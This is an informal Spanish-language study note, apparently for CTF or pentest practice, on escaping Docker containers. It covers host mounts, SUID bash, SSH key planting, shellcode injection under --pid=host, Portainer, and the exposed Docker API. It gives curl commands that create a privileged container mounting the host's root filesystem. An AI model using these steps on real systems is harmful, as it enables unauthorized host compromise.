Estas son tecnicas para escapar de un contenedor de Docker.

_1)_ Si estamos en un contenedor que en tiene una montura, hay varias formas de escapar si tenemos acceso como root, podemos:
	* _Asignar SUID a /bin/bash_, primero que todo
	* Podemos agregar nuestra clave publiva de SSH como _Authorized Keys_

	Para ver si tiene montura:

```bash
cat /etc/mount
```

 Y si vemos que hay un dispositivo real corriendo atras, por ejemplo, `/dev/sda1`, `/dev/vda`, `sdaX` -> Montura
 Si vemos las siguientes lineas:
`/var/lib/docker/volumes/appdata/_data /app/data rw,relatime 0 0` -> Montura
`/var/run/docker.sock /var/run/docker.sock rw 0 0` -> Montura 
`/host /host none rw,bind 0 0` -> Montura tipica de CTFs

Asi se ve cuando probablemente **no hayan monturas**:

```bash
overlay / overlay rw,relatime,lowerdir=... 0 0
proc /proc proc rw,nosuid,nodev 0 0
tmpfs /tmp tmpfs rw 0 0
```

---
_2)_ Podemos ejecutar el siguiente comando -> `ps -faux`. Y si el contenedor se desplego con la flag -> `--pid=host` -> _Podemos listar los procesos de la maquina real_. YYYY si vemos que algun proceso se ejecuto como **root**, podemos inyectar _shellcodes_ (instrucciones maliciosas a bajo nivel), con lo que podemos crear nuevos subprocesos a traves del cual se ejecutan comandos


---
_3)_ Si encontramos un _Portainer_ (plataforma en web que sirve para administrar contenedores) y logramos vulnerarlo, la escalada es una boludez. Podemos crear un nuevo contenedor con una montura (_/_: _/mnt/root_) y podemos hacer lo que queramos. 

---
https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html?highlight=2375#2375-2376-pentesting-docker

 _4)_ Escapar de contenedor abusando de la _API_ de Docker.

Si vemos que la maquina victima tiene el puerto _2375 (HTTP)_ o _2376 (HTTPS)_, entonces la maquina tiene la API de Docker activada (no viene por defecto)

Como vemos que tiene el puerto 2375 (o **2376**) abierto?? facil:
```bash
echo '' > /dev/tcp/172.17.0.1/2375 
```

Una vez hecho esto, podemos listar las imagenes de docker disponibles:
```bash
curl http://172.17.0.1:2375/images/json | jq
```
**NOTA**: El jq es para q se vea mas piola. 
**NOTA2**: Si cambias _images_ por _containers_ podes listar los containers.


AHORA LO IMPORTANTE WACHO:

Una vez listamos las imagenes, ejecutamos el siguiente comando (cambiando los valores por los nuestros obviamente -> cambiando la imagen por la que encontramos)
```bash
curl -X POST -H "Content-Type: application/json" http://172.17.0.2:2375/containers/create?name=test -d '{"Image":"ubuntu", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```
ESO NOS DEVUELVE UN ID DE CONTAINER (**GUARDARLO O ANOTARLO**).

Luego siguen los comandos, ver en el link que deje arriba y grepear por curl, el comando original viene con la flag --insecure pero s4vi dice q no hace falta.


